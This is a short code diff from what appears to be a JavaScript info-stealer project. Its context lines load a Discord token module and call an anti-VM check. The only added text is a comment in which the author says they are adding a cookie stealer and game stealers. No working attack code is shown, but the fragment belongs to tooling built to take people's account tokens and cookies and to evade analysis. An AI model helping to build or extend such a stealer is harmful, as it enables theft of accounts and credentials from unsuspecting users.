@@ -10,6 +10,11 @@ const discordTokens    = require('./modules/tokens/index.js');
 
 const CONFIG = require('./config/config.js');
 
+/**
+ * If you notice a bit of mess, it's because I'm implementing
+ * some better things like a cookie stealer, game stealers, and more.
+ */
+
 async function aurita() {
     try {
         await antiVM();
